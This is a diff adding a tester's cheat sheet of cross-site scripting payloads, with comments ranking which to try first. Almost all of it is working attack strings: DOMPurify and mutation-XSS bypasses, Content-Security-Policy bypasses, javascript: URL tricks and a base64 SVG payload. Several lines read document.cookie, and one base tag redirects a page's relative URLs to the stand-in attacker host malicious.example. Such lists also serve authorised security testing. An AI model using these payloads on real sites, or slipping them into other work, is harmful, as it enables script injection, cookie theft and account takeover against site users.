@@ -1,0 +1,69 @@
+// THE MUTATION XSS PAYLOADS ARE MUST USE IN ALL XSS TESTING GOING FORWARD -- WE SHOULD BE USING THESE FIRST BEFORE ANY OTHER PAYLOADS AND IN BLIND XSS TOO
+
+// see the csp bypass notes and the chrome bookmarks for many more payloads centered around CSP bypass. 
+
+// one very interesting CSP bypass technique: if a website whitelists a specific URL path to a CDN (jsdeliver or unpkg) we can craft a payload w/ that path along with some ../ (path traversals) that will end up going to the cdn xss library payloads (the specific payload paths are detailed in the chrome bookmark called **cdn CSP bypass**
+
+
+><svg/onload=globalThis[`al`+/ert/.source]`1`// 	// THIS PAYLOAD LOOKS AWESOME
+${alert(1)} 						// works w/ templates or maybe in a jquery script>		
+<a href=javascript:alert(1)>link</a>
+<iframe srcdoc="&lt;script>alert(1)&lt;/script>"></iframe>
+&#106avascript&colon;alert(1)
+javascript://targetdomain.com/%0aalert(1)		// safari only right now
+<a href=javascript:alert(1)>link</a>
+<iframe src="javascript:alert(1)"></iframe>
+javascript:alert('://')
+javascript:alert@target.com/#:// 		// url based change to our targets domain
+javascript:alert%28%27Slonser%20was%20here%21%27%29%3B%2F%2F@target.com#;alert(10);://eow5kas78d0wlv0.m.pipedream //insane..fully valid url repl w/target
+<!--><img src='sdffdfsd' onnerror='alert(1)'>>-->
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
+<?xml-stylesheet > <img src=x onerror="alert('DOMPurify bypassed!!!')"> ?>
+<svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd"><svg id="slonser" xmlns="http://www.w3.org/2000/svg"><?xml-stylesheet > <img src=x onerror="alert('DOMPurify bypassed!!!')"> ?></svg>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd"><_slonser-foo-bar data-slonser='&lt;iframe/src=javascript:alert()&gt;'></_slonser-foo-bar>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd"><_slonser-foo-bar data-slonser="<iframe/src=javascript:alert()>;"></_slonser-foo-bar>
+<!-- foo="bar--><s>Hi</s>" --> 
+<iframe srcdoc="<script>confirm(document.cookie)</script>"></iframe>	//works even in innerHTML context USE THIS W/ XSS HUNTER PAYLOAD
+
+//base and form based XSS bypass the default-src CSP
+<style>@keyframes x{}</style><base style="animation-name:x" onanimationend="alert(1)"></base>  //fires after css animation 
+<base href="https://malicious.example/" />						       //changes all relative urls on page to a domain we control
+<form action="javascript:alert(1)"><button>submit</button></form>
+<form id="f2"></form><button form="f2" formaction="javascript:alert(2)">submit</button>
+
+setTimeout('alert(1)') 		// if unsafe-eval rule is added to the csp 
+
+//mutation xss **some of these payloads are not technically mutation. and even the ones that are technically are not because the browsers fixed the mutation behavior. Regardless these are great payloads the SVG/style tags are great for xss.
+<svg></p><style><a id="</style><img/src=1 onerror=alert(1)>">
+<svg></textarea></p><style><a id="</style><img/src="1"/onerror=alert(1)>"></textarea></style></svg>
+<style><a id="</style><img src=x onerror=alert(1)>"></a></style>
+<svg><style><img/src="x"/onerror=alert()></style></svg>
+<svg><style><iframe srcdoc="<script>confirm(document.cookie)</script>"></iframe></style></svg>
+<svg></p><style><a id="</style><iframe srcdoc="<script>confirm(document.cookie)</script>"></iframe>">
+<svg><textarea><img/src='sdffdfsd'/onnerror='alert(1)'</textarea></svg>
+<svg></textarea><style><img/src="sdffdfsd"/onerror="alert(1)"></textarea></style></svg>
+<svg><style><img src='sdffdfsd' onnerror='alert(1)'></style></svg>
+<svg width='200' height='100' xmlns='https://www.w3.org/2000/svg><style><script src='https://foo.com'></script></style></svg>
+<svg width='200' height='100' xmlns='https://www.w3.org/2000/svg><style><a/id='</style><img/src=1 onerror=alert(1)>'></style></svg>
+<svg id="rectangle" xmlns="http://www.w3.org/2000/svg"><iframe xmlns="http://www.w3.org/1999/xhtml"/srcdoc="&lt;img/src=1 onerror=alert(1)&gt;" /></svg>
+
+
+
+//very interesting -- firefox only payload: 
+<svg><use href="data:image/svg+xml;base64,
+PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgd2lkdGg9IjEwMDAiIGhlaWdodD0iMTAwMCI+CiA8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiByZXF1aXJlZEV4dGVuc2lvbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPgoJPGlmcmFtZSB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgc3JjZG9jPSImbHQ7c2NyaXB0IHNyYz0nZGF0YTp0ZXh0L2phdmFzY3JpcHQscGFyZW50LnBvc3RNZXNzYWdlKCZxdW90O2EmcXVvdDssICZxdW90OyomcXVvdDspJyZndDsmbHQ7L3NjcmlwdCZndDsiIC8+CiAgICA8L2ZvcmVpZ25PYmplY3Q+Cjwvc3ZnPg==#rectangle"/></svg>
+
+<svg id="rectangle" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  width="1000" height="1000">
+  <foreignObject width="100" height="50" requiredExtensions="http://www.w3.org/1999/xhtml">
+<iframe xmlns="http://www.w3.org/1999/xhtml" 
+srcdoc="&lt;script
+ src='data:text/javascript,parent.postMessage(&quot;a&quot;, &quot;*&quot;)'
+&gt;&lt;/script&gt;" /></foreignObject></svg>
+
+
+
+
+
